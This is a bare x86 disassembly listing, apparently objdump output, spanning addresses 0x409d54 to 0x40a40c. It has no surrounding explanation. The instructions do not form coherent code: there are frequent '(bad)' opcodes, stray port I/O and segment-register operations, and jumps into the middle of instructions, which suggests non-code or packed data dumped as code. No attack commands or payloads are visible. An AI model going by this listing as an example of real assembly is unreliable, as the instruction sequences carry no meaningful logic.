  409d54:	and    al,0x3c
  409d56:	shl    DWORD PTR [edi-0x117b3e60],1
  409d5c:	in     eax,dx
  409d5d:	test   DWORD PTR [eax],0x293b1c87
  409d63:	or     al,0xd1
  409d65:	mov    eax,0xb9f665b8
  409d6a:	adc    eax,0x88a35007
  409d70:	push   0x5
  409d72:	pop    ss
  409d73:	mov    WORD PTR [esi+esi*2-0x59],es
  409d77:	dec    eax
  409d78:	or     eax,0x7f006821
  409d7d:	xor    ch,0x78
  409d80:	test   BYTE PTR [edi-0x6b5c2f09],dh
  409d86:	jae    0x409d22
  409d88:	mov    BYTE PTR [esi-0x47],ah
  409d8b:	sub    al,0xf4
  409d8d:	inc    eax
  409d8e:	sub    DWORD PTR [edx-0x66],eax
  409d91:	rcl    DWORD PTR [edi-0x205c636f],0x28
  409d98:	adc    dl,dh
  409d9a:	popf   
  409d9b:	add    DWORD PTR [esp+ecx*8-0x30],esp
  409d9f:	and    ah,bh
  409da1:	cmp    DWORD PTR [ebx],edi
  409da3:	sub    al,0x6e
  409da5:	std    
  409da6:	sub    dl,BYTE PTR [ebx+eiz*4-0x28]
  409daa:	imul   ebx,DWORD PTR [esi+0x1ddb3f21],0x12
  409db1:	lods   eax,DWORD PTR ds:[esi]
  409db2:	mov    ecx,0xba082e68
  409db7:	js     0x409d5a
  409db9:	or     al,0x29
  409dbb:	in     al,0xf9
  409dbd:	inc    BYTE PTR [eax+0x6b]
  409dc0:	mov    al,0xb9
  409dc2:	cmp    al,0x30
  409dc4:	es dec esp
  409dc6:	xor    BYTE PTR [edx+ebx*1],ah
  409dc9:	and    al,0x20
  409dcb:	adc    al,0x3e
  409dcd:	pusha  
  409dce:	js     0x409dcf
  409dd0:	(bad)  
  409dd1:	jmp    FWORD PTR [edi+0x22]
  409dd4:	and    al,BYTE PTR [eax]
  409dd6:	add    bh,BYTE PTR ds:0x2d062110
  409ddc:	pop    ss
  409ddd:	xor    al,0x2d
  409ddf:	cmp    BYTE PTR ds:0x6d29312e,ch
  409de5:	ins    BYTE PTR es:[edi],dx
  409de6:	imul   ebp,DWORD PTR [edx+0x69],0x69
  409dea:	sbb    BYTE PTR [edi],cl
  409dec:	push   ds
  409ded:	sbb    ch,BYTE PTR [edx]
  409def:	(bad)  
  409df0:	(bad)  
  409df1:	(bad)  
  409df2:	(bad)  
  409df3:	cmp    al,0x6
  409df5:	imul   ecx,DWORD PTR [edx],0x7a742c20
  409dfb:	jae    0x409e1d
  409dfd:	sbb    BYTE PTR [ebp+0x76],dh
  409e00:	pop    ds
  409e01:	add    esi,DWORD PTR [ebx]
  409e03:	xor    DWORD PTR [eax],esi
  409e05:	add    eax,0x516b767d
  409e0a:	or     BYTE PTR [edi+0x4c],dl
  409e0d:	push   esp
  409e0e:	movq   QWORD PTR [edx+0x51],mm7
  409e12:	or     bh,bh
  409e14:	(bad)  
  409e15:	(bad)  
  409e16:	push   DWORD PTR [edi+0x66]
  409e19:	push   esi
  409e1a:	pop    ebp
  409e1b:	push   edi
  409e1c:	bound  ecx,QWORD PTR [ecx+0x13]
  409e1f:	outs   dx,DWORD PTR ds:[esi]
  409e20:	dec    eax
  409e21:	dec    ebp
  409e22:	push   ss
  409e23:	jb     0x409e95
  409e25:	inc    ebx
  409e26:	popa   
  409e27:	dec    ebp
  409e28:	adc    eax,0x572c5e16
  409e2d:	jp     0x409e89
  409e2f:	sub    bh,BYTE PTR [ebp+0x56]
  409e32:	inc    eax
  409e33:	inc    ecx
  409e34:	ins    BYTE PTR es:[edi],dx
  409e35:	and    al,0x21
  409e37:	(bad)  
  409e38:	(bad)  
  409e3a:	dec    DWORD PTR [ebx+0x5a]
  409e3d:	pop    esi
  409e3e:	jle    0x409e9e
  409e40:	xor    eax,0x39493e65
  409e45:	cmp    BYTE PTR [edi],dh
  409e47:	ss cmp eax,0x4397e6e
  409e4d:	pop    ebp
  409e4e:	pop    edi
  409e4f:	push   ebx
  409e50:	add    ebx,DWORD PTR [ecx+0x31]
  409e53:	or     dl,BYTE PTR [edi+eiz*1+0x23]
  409e57:	push   edx
  409e58:	ins    BYTE PTR es:[edi],dx
  409e59:	or     dh,bh
  409e5b:	(bad)  
  409e5c:	cmp    ebx,DWORD PTR [eax+0x28]
  409e5f:	or     DWORD PTR [ebx+ebp*2],eax
  409e62:	adc    al,0xf
  409e64:	sub    al,0x1e
  409e66:	ss sbb BYTE PTR ss:[ebx],al
  409e6a:	adc    ecx,DWORD PTR [edx+edi*8]
  409e6d:	(bad)  
  409e6e:	jmp    FWORD PTR [ebx+0x213d1d32]
  409e74:	jae    0x409e9e
  409e76:	jl     0x409eb5
  409e78:	jg     0x409ea6
  409e7a:	jo     0x409eeb
  409e7c:	jnp    0x409ea6
  409e7e:	jno    0x409e86
  409e80:	(bad)  
  409e82:	or     BYTE PTR [edi],dl
  409e84:	add    edx,DWORD PTR [eax+0x7e]
  409e87:	ins    DWORD PTR es:[edi],dx
  409e88:	(bad)  
  409e89:	(bad)  
  409e8a:	jmp    FWORD PTR [edi+0xb437910]
  409e90:	pop    eax
  409e91:	jbe    0x409ef9
  409e93:	pop    ss
  409e94:	dec    esp
  409e95:	popa   
  409e96:	push   esp
  409e97:	adc    eax,DWORD PTR [eax+0x1c]
  409e9a:	add    edx,DWORD PTR [edi]
  409e9c:	bound  edx,QWORD PTR [eax]
  409e9e:	push   ebx
  409e9f:	sbb    ecx,DWORD PTR [eax+0x66]
  409ea2:	push   ss
  409ea3:	sub    edi,DWORD PTR [ecx+0x28]
  409ea6:	ins    DWORD PTR es:[edi],dx
  409ea7:	jg     0x409ecc
  409ea9:	jmp    0x409eaa
  409eab:	(bad)  
  409eac:	(bad)  
  409ead:	jnp    0x409f0e
  409eaf:	jle    0x409ef3
  409eb1:	and    BYTE PTR [edx+0x23],ah
  409eb4:	and    ah,BYTE PTR [ecx]
  409eb6:	and    BYTE PTR [edi],bh
  409eb8:	cmp    al,0x4f
  409eba:	pop    ecx
  409ebb:	cmp    DWORD PTR [edx],edi
  409ebd:	cmp    bl,BYTE PTR [esi+0x51]
  409ec0:	pop    edi
  409ec1:	inc    edi
  409ec2:	dec    esi
  409ec3:	push   esi
  409ec4:	dec    eax
  409ec5:	xor    BYTE PTR [ebx],bl
  409ec7:	sub    bh,ch
  409ec9:	(bad)  
  409eca:	(bad)  
  409ecb:	inc    esi
  409ecd:	add    dl,BYTE PTR es:[ebx]
  409ed0:	push   ebp
  409ed1:	push   ebp
  409ed2:	and    BYTE PTR [ecx],dl
  409ed4:	dec    ecx
  409ed5:	pop    ecx
  409ed6:	add    eax,0x283c1b1a
  409edb:	femms  
  409edd:	adc    esi,DWORD PTR [edi]
  409edf:	push   ss
  409ee0:	sbb    al,0x2
  409ee2:	pop    ss
  409ee3:	and    al,0x18
  409ee5:	add    eax,0xff0a3d26
  409eea:	(bad)  
  409eeb:	push   DWORD PTR [edi-0x26]
  409eee:	push   cs
  409eef:	jnp    0x409f2a
  409ef1:	add    esi,DWORD PTR cs:[edx]
  409ef4:	xor    DWORD PTR [edi],ecx
  409ef6:	sub    bl,BYTE PTR [ebx]
  409ef8:	xor    esi,DWORD PTR [eax+0x5e]
  409efb:	push   cs
  409efc:	dec    edi
  409efd:	jb     0x409f4d
  409eff:	arpl   WORD PTR [eax+0x4c],cx
  409f02:	push   esi
  409f03:	push   es
  409f04:	dec    esp
  409f05:	push   ebp
  409f06:	add    BYTE PTR [ebx+0x7c],al
  409f09:	(bad)  
  409f0a:	(bad)  
  409f0b:	(bad)  
  409f0d:	popa   
  409f0e:	ins    DWORD PTR es:[edi],dx
  409f0f:	sbb    cl,BYTE PTR [esi+0x7d]
  409f12:	sbb    BYTE PTR [edi-0x6],al
  409f15:	gs popa 
  409f17:	adc    al,0x49
  409f19:	adc    BYTE PTR [edx+0x77],ch
  409f1c:	ja     0x409f77
  409f1e:	je     0x409f87
  409f20:	pop    esi
  409f21:	sub    ch,BYTE PTR [edi+0x4e]
  409f24:	and    BYTE PTR [ebx+edi*2],ah
  409f27:	jo     0x409fa6
  409f29:	jle    0x409f2a
  409f2b:	(bad)  
  409f2c:	(bad)  
  409f2d:	jmp    DWORD PTR [edx]
  409f2f:	gs pop esi
  409f31:	jp     0x409f8a
  409f33:	inc    ebx
  409f34:	inc    edx
  409f35:	pop    esp
  409f36:	jge    0x409f9c
  409f38:	pop    edx
  409f39:	sub    BYTE PTR [esi+0x50],cl
  409f3c:	dec    esp
  409f3d:	inc    edx
  409f3e:	push   esi
  409f3f:	push   eax
  409f40:	sub    BYTE PTR [ebx+0x24],bl
  409f43:	cmp    bl,BYTE PTR [eax+eax*1]
  409f46:	push   es
  409f47:	push   es
  409f48:	sub    ecx,DWORD PTR [ecx]
  409f4a:	and    BYTE PTR ss:[edx],dh
  409f4d:	push   esp
  409f4e:	fistp  QWORD PTR [ecx+edi*4+0x141107e0]
  409f55:	mov    dh,0xa
  409f57:	cmp    al,0x2b
  409f59:	sbb    esi,DWORD PTR [eax]
  409f5b:	pop    es
  409f5c:	cmp    dh,BYTE PTR [edi]
  409f5e:	cmp    al,0x79
  409f60:	jnp    0x409f66
  409f62:	(bad)  
  409f63:	(bad)  
  409f64:	(bad)  
  409f65:	call   FWORD PTR [edx]
  409f67:	and    al,0x20
  409f69:	es or  ebp,DWORD PTR es:[edi]
  409f6d:	add    edx,DWORD PTR [eax]
  409f6f:	adc    dh,BYTE PTR [ecx+ebp*1+0x9]
  409f73:	adc    DWORD PTR [ebx],ecx
  409f75:	je     0x409fe0
  409f77:	packsswb mm2,QWORD PTR [esi+0x56]
  409f7b:	jnp    0x409fd3
  409f7d:	js     0x409fd9
  409f7f:	bound  eax,QWORD PTR [esi+edx*2]
  409f82:	pop    esp
  409f83:	dec    edx
  409f84:	sbb    esp,DWORD PTR [edi+esi*1-0x44]
  409f88:	loope  0x409f89
  409f8a:	jns    0x409f9e
  409f8c:	sbb    DWORD PTR [eax],ebx
  409f8e:	push   ebp
  409f8f:	push   edx
  409f90:	pop    esp
  409f91:	jae    0x409fed
  409f93:	popa   
  409f94:	adc    esi,DWORD PTR [esi+0x50465e5d]
  409f9a:	cwde   
  409f9b:	push   ebx
  409f9c:	das    
  409f9d:	jl     0x409f5e
  409f9f:	loope  0x409fa0
  409fa1:	add    eax,0x3e2126ac
  409fa6:	pop    esp
  409fa7:	pop    edx
  409fa8:	cmp    al,0x34
  409faa:	bound  ebp,QWORD PTR [eax+0x6f]
  409fad:	cmp    eax,0x34429259
  409fb2:	xor    esi,DWORD PTR [eax]
  409fb4:	inc    ebx
  409fb5:	es pop ss
  409fb7:	loopne 0x409fb8
  409fb9:	(bad)  
  409fba:	cmp    esp,DWORD PTR ds:0x595c5a29
  409fc0:	add    BYTE PTR [esi+0x23],dl
  409fc3:	dec    ebx
  409fc4:	cmp    ecx,DWORD PTR cs:[esi+0x52]
  409fc8:	sbb    eax,0x19150b16
  409fcd:	dec    eax
  409fce:	push   ss
  409fcf:	push   ds
  409fd0:	add    BYTE PTR [eax+ebp*8-0x1],cl
  409fd4:	and    BYTE PTR [edi+0x5c],0x11
  409fd8:	sub    BYTE PTR [edx+0xe],ah
  409fdb:	jl     0x40a015
  409fdd:	sbb    ecx,DWORD PTR [eax]
  409fdf:	jnp    0x40a00d
  409fe1:	cmp    al,bh
  409fe3:	(bad)  
  409fe4:	(bad)  
  409fe6:	in     al,0x2e
  409fe8:	cli    
  409fe9:	jno    0x40a056
  409feb:	push   ebx
  409fec:	je     0x40a03e
  409fee:	jnp    0x40a06d
  409ff0:	push   eax
  409ff1:	arpl   WORD PTR [ebp+0x1],dx
  409ff4:	jne    0x40a042
  409ff6:	pop    ds
  409ff7:	or     esp,DWORD PTR [eax+0x7fffffff]
  409ffd:	pusha  
  409ffe:	sbb    al,0x69
  40a000:	sbb    DWORD PTR [edx+0x59],ecx
  40a003:	pop    edi
  40a004:	push   eax
  40a005:	js     0x40a019
  40a007:	dec    eax
  40a008:	push   esp
  40a009:	bound  edx,QWORD PTR ds:0x7078726a
  40a00f:	jo     0x40a08d
  40a011:	push   edx
  40a012:	and    cl,BYTE PTR [edx+0x4a]
  40a015:	dec    eax
  40a016:	and    bh,BYTE PTR [ecx+0x76]
  40a019:	and    esp,DWORD PTR ds:0xfffff85a
  40a01f:	inc    DWORD PTR [edx+0x7a]
  40a022:	jle    0x40a084
  40a024:	ins    BYTE PTR es:[edi],dx
  40a025:	inc    edx
  40a026:	dec    eax
  40a027:	pop    edx
  40a028:	pop    edx
  40a029:	pop    eax
  40a02a:	xor    dh,BYTE PTR [esi+0x49]
  40a02d:	dec    esi
  40a02e:	xor    eax,0x818524a
  40a033:	add    cl,BYTE PTR [edx]
  40a035:	and    al,0x2f
  40a037:	cmp    ecx,DWORD PTR [esi]
  40a039:	ss push eax
  40a03b:	adc    eax,0xffffff55
  40a040:	scas   eax,DWORD PTR es:[edi]
  40a041:	ret    0xb28
  40a044:	imul   eax,DWORD PTR ds:0x10143a32,0x8
  40a04b:	adc    al,0x6
  40a04d:	pusha  
  40a04e:	and    eax,0x1867613e
  40a053:	sbb    eax,0x2a22030a
  40a058:	pop    es
  40a059:	cmp    BYTE PTR [edi],al
  40a05b:	adc    al,0x16
  40a05d:	jo     0x40a040
  40a05f:	fcomip st,st(0)
  40a061:	jmp    FWORD PTR [esi]
  40a063:	push   cs
  40a064:	es ja  0x40a06f
  40a067:	ins    DWORD PTR es:[edi],dx
  40a068:	outs   dx,BYTE PTR ds:[esi]
  40a069:	dec    esp
  40a06a:	push   edx
  40a06b:	pop    edx
  40a06c:	ja     0x40a0bb
  40a06e:	mov    ds:0x55f0066,al
  40a073:	sbb    eax,0xc37d7807
  40a078:	neg    bh
  40a07a:	mov    al,0x3e
  40a07c:	inc    edx
  40a07d:	dec    edx
  40a07e:	js     0x40a0e3
  40a080:	pop    esi
  40a081:	jbe    0x40a093
  40a083:	dec    edi
  40a084:	push   eax
  40a085:	inc    esi
  40a086:	pop    ss
  40a087:	push   0x7a727632
  40a08c:	(bad)  
  40a08d:	(bad)  
  40a08e:	in     eax,dx
  40a08f:	push   es
  40a090:	aam    0x6e
  40a092:	inc    esi
  40a093:	and    dl,dh
  40a095:	bound  esp,QWORD PTR [edi]
  40a097:	pop    eax
  40a098:	pop    ebp
  40a099:	je     0x40a10a
  40a09b:	bound  ebp,QWORD PTR [edx+0x44]
  40a09e:	cmp    DWORD PTR [edx+0x7e],eax
  40a0a1:	push   esi
  40a0a2:	xor    BYTE PTR [ecx+0x4e],ch
  40a0a5:	inc    eax
  40a0a6:	(bad)  
  40a0a7:	inc    DWORD PTR [esi+0x3e2637ff]
  40a0ad:	push   ebp
  40a0ae:	or     al,0x4
  40a0b0:	or     BYTE PTR [esi],ah
  40a0b2:	push   esp
  40a0b3:	jbe    0x40a0e9
  40a0b5:	push   esi
  40a0b6:	or     al,0x57
  40a0b8:	imul   edx,DWORD PTR es:[esi],0x342a100e
  40a0bf:	cmp    BYTE PTR [esi],dl
  40a0c1:	popa   
  40a0c2:	ins    WORD PTR es:[edi],dx
  40a0c4:	adc    eax,0x26ffffff
  40a0c9:	data16 cmp al,0x23
  40a0cc:	bound  ecx,QWORD PTR ds:0xc141b06
  40a0d2:	cmp    eax,DWORD PTR gs:[esi]
  40a0d5:	adc    BYTE PTR [edi],bl
  40a0d7:	push   ss
  40a0d8:	add    DWORD PTR [edi],eax
  40a0da:	or     dl,BYTE PTR [ebx]
  40a0dc:	add    al,0x78
  40a0de:	addr16 dec esp
  40a0e0:	outs   dx,BYTE PTR ds:[esi]
  40a0e1:	jno    0x40a0e2
  40a0e3:	jmp    FWORD PTR [edi+0x7b427ff8]
  40a0e9:	inc    ebx
  40a0ea:	or     eax,0x5a094074
  40a0ef:	sbb    dl,BYTE PTR [ebp+edx*1+0x45]
  40a0f3:	ins    BYTE PTR es:[edi],dx
  40a0f4:	jb     0x40a173
  40a0f6:	adc    DWORD PTR [esi+0x10],ebx
  40a0f9:	inc    esp
  40a0fa:	sbb    al,0x53
  40a0fc:	dec    edi
  40a0fd:	sbb    DWORD PTR [edx+0x27],edx
  40a100:	(bad)  
  40a101:	(bad)  
  40a102:	(bad)  
  40a103:	jmp    FWORD PTR [esi]
  40a105:	push   edx
  40a106:	jbe    0x40a169
  40a108:	pusha  
  40a109:	sub    DWORD PTR [ebx],esi
  40a10b:	jnp    0x40a169
  40a10d:	js     0x40a152
  40a10f:	push   ebp
  40a110:	js     0x40a15d
  40a112:	jge    0x40a14d
  40a114:	dec    ebp
  40a115:	je     0x40a13e
  40a117:	xor    edi,DWORD PTR [ecx]
  40a119:	cmp    DWORD PTR [eax+0x37],ebx
  40a11c:	dec    edi
  40a11d:	popa   
  40a11e:	dec    edx
  40a11f:	gs pop eax
  40a121:	dec    edx
  40a122:	and    BYTE PTR [edx],ah
  40a124:	(bad)  
  40a125:	mov    edi,0x5d27e3a0
  40a12a:	(bad)  
  40a12c:	xor    BYTE PTR [ebp+esi*1+0x50065334],ch
  40a133:	sbb    DWORD PTR [ecx+0x17],esi
  40a136:	or     eax,0x771e2037
  40a13b:	and    eax,0xa6ffffa2
  40a140:	sbb    BYTE PTR [edx],al
  40a142:	and    DWORD PTR [ebx+eax*1],esp
  40a145:	or     DWORD PTR [edx+eax*1+0x19],esp
  40a149:	and    DWORD PTR [edx],edi
  40a14b:	push   es
  40a14c:	cmp    al,BYTE PTR [edi]
  40a14e:	es jae 0x40a174
  40a151:	adc    eax,0x374b2231
  40a156:	cld    
  40a157:	call   DWORD PTR [edx]
  40a159:	dec    ebx
  40a15a:	pop    eax
  40a15b:	dec    eax
  40a15c:	ja     0x40a1a6
  40a15e:	jle    0x40a1b8
  40a160:	jno    0x40a1b6
  40a162:	data16 jns 0x40a1d8
  40a165:	inc    edx
  40a166:	cmp    BYTE PTR [edi+0x5b],0x17
  40a16a:	jmp    0x3caba04e
  40a16f:	adc    esp,DWORD PTR [edx+0x7b]
  40a172:	push   esp
  40a173:	jbe    0x40a189
  40a175:	outs   dx,BYTE PTR ds:[esi]
  40a176:	add    BYTE PTR [eax],dl
  40a178:	jb     0x40a1a2
  40a17a:	sub    esi,DWORD PTR [eax+0x4f]
  40a17d:	push   ebp
  40a17e:	jl     0x40a17f
  40a180:	(bad)  
  40a181:	fbstp  TBYTE PTR [ecx+0x42746524]
  40a187:	popa   
  40a188:	daa    
  40a189:	jle    0x40a1e8
  40a18b:	inc    esp
  40a18c:	pusha  
  40a18d:	dec    ecx
  40a18e:	pop    ebp
  40a18f:	inc    ebp
  40a190:	cmp    ebx,DWORD PTR [ecx+0x42]
  40a193:	arpl   WORD PTR [edi],di
  40a195:	outs   dx,BYTE PTR ds:[esi]
  40a196:	push   esi
  40a197:	dec    edi
  40a198:	inc    esi
  40a199:	dec    esi
  40a19a:	cmp    esp,DWORD PTR [esi]
  40a19c:	(bad)  
  40a19d:	dec    DWORD PTR [edx+0x230838ff]
  40a1a3:	or     eax,0x162d1420
  40a1a8:	push   ss
  40a1a9:	dec    esp
  40a1aa:	adc    dh,BYTE PTR [eax]
  40a1ac:	push   0x19
  40a1ae:	cmp    al,0x8
  40a1b0:	aaa    
  40a1b1:	push   cs
  40a1b2:	outs   dx,BYTE PTR ds:[esi]
  40a1b3:	adc    al,0x15
  40a1b5:	sbb    esp,DWORD PTR [ecx+0x32]
  40a1b8:	imul   ebx,DWORD PTR [ecx],0xffffffff
  40a1bb:	pop    ss
  40a1bc:	mov    ch,0x55
  40a1be:	push   ss
  40a1bf:	daa    
  40a1c0:	sbb    dl,ah
  40a1c2:	sub    DWORD PTR [esi],esi
  40a1c4:	sbb    BYTE PTR [esi+0x13],bh
  40a1c7:	jae    0x40a1ef
  40a1c9:	or     cl,BYTE PTR [esi]
  40a1cb:	xor    esp,DWORD PTR [esi]
  40a1cd:	dec    esp
  40a1ce:	jns    0x40a207
  40a1d0:	xor    al,0x2d
  40a1d2:	clc    
  40a1d3:	dec    ecx
  40a1d4:	pop    esi
  40a1d5:	bound  esi,QWORD PTR [ebp+0x72]
  40a1d8:	pushf  
  40a1d9:	movq   mm6,mm4
  40a1dc:	add    ebx,DWORD PTR [edi+ebx*1+0x2fff434a]
  40a1e3:	cli    
  40a1e4:	jmp    FWORD PTR [ebx+0x1b]
  40a1e7:	sbb    ch,BYTE PTR [ebx+0x49]
  40a1ea:	imul   edx,DWORD PTR [esi],0x15
  40a1ed:	adc    eax,0x454f4c53
  40a1f2:	fidiv  WORD PTR [esi+0x55]
  40a1f5:	jge    0x40a261
  40a1f7:	xor    bh,BYTE PTR [edx+0x41]
  40a1fa:	inc    ebp
  40a1fb:	sub    eax,0xf82b5a6d
  40a200:	pop    ss
  40a201:	pop    esp
  40a202:	icebp  
  40a203:	fs push esp
  40a205:	dec    eax
  40a206:	pusha  
  40a207:	sahf   
  40a208:	js     0x40a275
  40a20a:	jp     0x40a1c2
  40a20c:	dec    eax
  40a20d:	push   ebx
  40a20e:	ss push edx
  40a210:	push   edx
  40a211:	jo     0x40a24f
  40a213:	daa    
  40a214:	(bad)  
  40a215:	(bad)  
  40a216:	jmp    FWORD PTR [edi+0x76]
  40a219:	or     bl,BYTE PTR ds:[ebx]
  40a21c:	push   ebp
  40a21d:	dec    ecx
  40a21e:	pop    esp
  40a21f:	push   esi
  40a220:	add    eax,0x13515217
  40a225:	imul   ebp,DWORD PTR [esi],0x2a082c3d
  40a22b:	push   ss
  40a22c:	or     eax,0x210c6212
  40a231:	adc    al,0x67
  40a233:	ss add eax,0xffa8357c
  40a239:	or     eax,0x28180e28
  40a23e:	cs or  eax,0x33b41429
  40a244:	add    BYTE PTR [esi],ch
  40a246:	adc    BYTE PTR [ebx+ecx*8+0x28],ch
  40a24a:	clc    
  40a24b:	pop    ss
  40a24c:	mov    dl,0x55
  40a24e:	pop    ebx
  40a24f:	push   edx
  40a250:	pop    ecx
  40a251:	inc    ebp
  40a252:	addr16 jb 0x40a295
  40a255:	add    al,0x70
  40a257:	(bad)  
  40a258:	jg     0x40a255
  40a25a:	aaa    
  40a25b:	sbb    al,0x4c
  40a25d:	js     0x40a2c4
  40a25f:	dec    esi
  40a260:	jl     0x40a2c1
  40a262:	push   edx
  40a263:	outs   dx,DWORD PTR ds:[esi]
  40a264:	stos   BYTE PTR es:[edi],al
  40a265:	jnp    0x40a2b7
  40a267:	inc    edx
  40a268:	data16 jp 0x40a2b1
  40a26b:	jo     0x40a292
  40a26d:	push   edx
  40a26e:	push   esp
  40a26f:	pop    ebp
  40a270:	pop    ecx
  40a271:	jge    0x40a2ba
  40a273:	push   ebx
  40a274:	hlt    
  40a275:	jg     0x40a268
  40a277:	jmp    DWORD PTR [ebp+0x63]
  40a27a:	jge    0x40a2f7
  40a27c:	bound  eax,QWORD PTR [ebp+0x5b]
  40a27f:	jne    0x40a2c5
  40a281:	dec    esi
  40a282:	jo     0x40a2ef
  40a284:	shl    BYTE PTR ds:0x404f4e3d,1
  40a28a:	or     BYTE PTR [edi],al
  40a28c:	push   cs
  40a28d:	cmp    bh,bh
  40a28f:	adc    eax,0x23805f8a
  40a294:	push   esp
  40a295:	adc    BYTE PTR [edx+ecx*1],dh
  40a298:	sub    DWORD PTR [eax+esi*8+0x6f],ebp
  40a29c:	xor    DWORD PTR [ecx],ebx
  40a29e:	xor    DWORD PTR [eax+ebp*2],ecx
  40a2a1:	sbb    ecx,DWORD PTR [edi]
  40a2a3:	adc    edi,DWORD PTR [edi+0x31fff6e0]
  40a2a9:	aas    
  40a2aa:	aaa    
  40a2ab:	add    eax,0x260b1b29
  40a2b0:	sub    DWORD PTR [ebx+edi*1+0x1],esi
  40a2b4:	mov    BYTE PTR ds:0x1ae60b76,ch
  40a2ba:	adc    BYTE PTR ds:0xbb495868,al
  40a2c0:	(bad)  
  40a2c1:	pop    ebp
  40a2c2:	jmp    FWORD PTR [eax+edx*1+0x5c]
  40a2c6:	jbe    0x40a310
  40a2c8:	jnp    0x40a33d
  40a2ca:	dec    esp
  40a2cb:	dec    esp
  40a2cc:	jp     0x40a344
  40a2ce:	inc    ecx
  40a2cf:	outs   dx,BYTE PTR ds:[esi]
  40a2d0:	push   ds
  40a2d1:	pop    ebx
  40a2d2:	sbb    BYTE PTR [ebx],bl
  40a2d4:	jp     0x40a32e
  40a2d6:	push   esi
  40a2d7:	clc    
  40a2d8:	inc    DWORD PTR [ebp+0x47]
  40a2db:	pop    edx
  40a2dc:	inc    edi
  40a2dd:	push   esi
  40a2de:	dec    esp
  40a2df:	jl     0x40a335
  40a2e1:	addr16 pop eax
  40a2e3:	jp     0x40a31a
  40a2e5:	arpl   WORD PTR [ecx+0x64],di
  40a2e8:	dec    edi
  40a2e9:	js     0x40a318
  40a2eb:	jns    0x40a2ec
  40a2ed:	(bad)  
  40a2ee:	jmp    FWORD PTR [edi-0x44]
  40a2f1:	popa   
  40a2f2:	cmp    al,0x47
  40a2f4:	addr16 dec eax
  40a2f6:	jl     0x40a332
  40a2f8:	inc    eax
  40a2f9:	outs   dx,BYTE PTR ds:[esi]
  40a2fa:	xor    al,0x77
  40a2fc:	jae    0x40a32d
  40a2fe:	inc    edx
  40a2ff:	ja     0x40a371
  40a301:	push   ds
  40a302:	push   ebp
  40a303:	xor    eax,0x39252c03
  40a308:	or     BYTE PTR [ebx],al
  40a30a:	das    
  40a30b:	xor    cl,BYTE PTR [edi]
  40a30d:	(bad)  
  40a30e:	jmp    DWORD PTR [edx]
  40a310:	lds    ecx,FWORD PTR [eax]
  40a312:	and    BYTE PTR [esi],dh
  40a314:	shr    BYTE PTR [ebx],1
  40a316:	ds push ds
  40a318:	cs sbb eax,0x206c131b
  40a31e:	and    BYTE PTR [ecx+0x68],ah
  40a321:	and    BYTE PTR [ecx+eiz*2],bl
  40a324:	sub    eax,DWORD PTR [ebx+0x78ffffe2]
  40a32a:	and    al,0xf
  40a32c:	sbb    al,0x1b
  40a32e:	xor    DWORD PTR [edi+0x15],esi
  40a331:	add    bh,BYTE PTR [ecx]
  40a333:	and    BYTE PTR [ebx+eax*1],dh
  40a336:	jnp    0x40a384
  40a338:	outs   dx,DWORD PTR ds:[esi]
  40a339:	or     BYTE PTR [eax+0x58],cl
  40a33c:	pop    esp
  40a33d:	or     al,BYTE PTR [esi+0x6f69ffff]
  40a343:	add    eax,0x546875e8
  40a348:	sbb    eax,0x4d4b666d
  40a34d:	pop    ebx
  40a34e:	jno    0x40a3b2
  40a350:	push   edi
  40a351:	pop    esi
  40a352:	dec    ecx
  40a353:	fs (bad) 
  40a355:	(bad)  
  40a356:	in     eax,dx
  40a357:	mov    ds:0x244d52ff,al
  40a35c:	pop    esi
  40a35d:	dec    esi
  40a35e:	sub    BYTE PTR [ecx+ebp*1],ch
  40a361:	outs   dx,DWORD PTR ds:[esi]
  40a362:	rol    BYTE PTR [eax+edi*1+0x77],0xda
  40a367:	popa   
  40a368:	dec    esp
  40a369:	imul   esi,DWORD PTR [ebp+0x71],0x69
  40a36d:	dec    edx
  40a36e:	popa   
  40a36f:	(bad)  
  40a370:	(bad)  [esi+0x1]
  40a373:	jle    0x40a3dc
  40a375:	pusha  
  40a376:	jae    0x40a3c8
  40a378:	pop    ecx
  40a379:	pop    ss
  40a37a:	xchg   edx,eax
  40a37b:	cmp    ebx,DWORD PTR [ebx+0xa]
  40a37e:	and    DWORD PTR [edi],esi
  40a380:	sub    dl,BYTE PTR [edx+0x53]
  40a383:	push   ss
  40a384:	xor    eax,0xff805fff
  40a389:	es das 
  40a38b:	sub    eax,0x13687317
  40a390:	cmp    eax,0x121d561c
  40a395:	xor    eax,0x763c6411
  40a39a:	and    bh,BYTE PTR [ebx+0x19]
  40a39d:	jb     0x40a3a0
  40a39f:	aas    
  40a3a0:	hlt    
  40a3a1:	fwait
  40a3a2:	(bad)  
  40a3a3:	fistp  DWORD PTR [edx]
  40a3a5:	das    
  40a3a6:	push   es
  40a3a7:	je     0x40a3c9
  40a3a9:	jnp    0x40a419
  40a3ab:	add    al,0x46
  40a3ad:	or     DWORD PTR [edx],edx
  40a3af:	jb     0x40a393
  40a3b1:	pop    esp
  40a3b2:	jnp    0x40a3cc
  40a3b4:	add    al,0x67
  40a3b6:	jo     0x40a3b7
  40a3b8:	fcomip st,st(0)
  40a3ba:	pop    edi
  40a3bb:	into   
  40a3bc:	pop    es
  40a3bd:	add    edx,DWORD PTR [esi]
  40a3bf:	pop    edx
  40a3c0:	inc    esi
  40a3c1:	jp     0x40a420
  40a3c3:	push   ds
  40a3c4:	pop    ecx
  40a3c5:	js     0x40a3d9
  40a3c7:	push   edx
  40a3c8:	push   0x42541b73
  40a3cd:	cs jae 0x40a428
  40a3d0:	push   edx
  40a3d1:	jb     0x40a424
  40a3d3:	(bad)  
  40a3d4:	(bad)  
  40a3d5:	mov    ebx,0x737a6cfe
  40a3da:	jnp    0x40a43c
  40a3dc:	jb     0x40a437
  40a3de:	outs   dx,BYTE PTR ds:[esi]
  40a3df:	jno    0x40a426
  40a3e1:	gs inc ebp
  40a3e3:	jne    0x40a44b
  40a3e5:	cmp    BYTE PTR [esi+0x6d],al
  40a3e8:	sub    BYTE PTR [ebp+0x53],dh
  40a3eb:	inc    ecx
  40a3ec:	dec    ecx
  40a3ed:	pushw  0x5c28
  40a3f1:	add    eax,0x3dffffff
  40a3f6:	and    BYTE PTR [ebx],dl
  40a3f8:	cvtps2pi mm4,QWORD PTR [edx]
  40a3fb:	push   esp
  40a3fc:	xor    DWORD PTR [ecx],ebp
  40a3fe:	daa    
  40a3ff:	and    DWORD PTR [edi],edx
  40a401:	add    al,0x25
  40a403:	cmp    ah,BYTE PTR [di]
  40a406:	je     0x40a414
  40a408:	or     DWORD PTR [ecx],esp
  40a40a:	jl     0x40a440
  40a40c:	add    eax,0x255311c
